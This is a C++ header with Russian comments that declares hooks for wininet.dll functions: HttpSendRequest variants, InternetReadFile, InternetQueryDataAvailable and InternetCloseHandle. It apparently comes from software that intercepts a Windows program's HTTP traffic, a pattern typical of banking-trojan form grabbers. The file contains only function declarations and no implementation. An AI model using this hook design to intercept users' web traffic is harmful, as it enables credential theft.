/*
Перехват wininet.dll
*/
#pragma once

namespace WininetHook
{
	/*
	Инициализация.

	*/
	void init(void);

	/*
	Деинициализация.
	*/
	void uninit(void);

	/*
	Перехватчик HttpSendRequestW.
	*/
	BOOL WINAPI hookerHttpSendRequestW(HINTERNET request, LPWSTR headers, DWORD headersLength, LPVOID optional, DWORD optionalLength);

	/*
	Перехватчик HttpSendRequestA.
	*/
	BOOL WINAPI hookerHttpSendRequestA(HINTERNET request, LPSTR headers, DWORD headersLength, LPVOID optional, DWORD optionalLength);

	/*
	Перехватчик HttpSendRequestExW.
	*/
	BOOL WINAPI hookerHttpSendRequestExW(HINTERNET request, LPINTERNET_BUFFERSW buffersIn, LPINTERNET_BUFFERSW buffersOut, DWORD flags, DWORD_PTR context);

	/*
	Перехватчик HttpSendRequestExA.
	*/
	BOOL WINAPI hookerHttpSendRequestExA(HINTERNET request, LPINTERNET_BUFFERSA buffersIn, LPINTERNET_BUFFERSA buffersOut, DWORD flags, DWORD_PTR context);

	/*
	Перехватчик InternetCloseHandle.
	*/
	BOOL WINAPI hookerInternetCloseHandle(HINTERNET handle);

	/*
	Перехватчик InternetReadFile.
	*/
	BOOL WINAPI hookerInternetReadFile(HINTERNET handle, LPVOID buffer, DWORD numberOfBytesToRead, LPDWORD numberOfBytesReaded);

	/*
	Перехватчик InternetReadFileExA. Также вызывается от InternetReadFileExW
	*/
	BOOL WINAPI hookerInternetReadFileExA(HINTERNET handle, LPINTERNET_BUFFERSA buffersOut, DWORD flags, DWORD_PTR context);

	/*
	Перехватчик InternetQueryDataAvailable.
	*/
	BOOL WINAPI hookerInternetQueryDataAvailable(HINTERNET handle, LPDWORD numberOfBytesAvailable, DWORD flags, DWORD_PTR context);
};
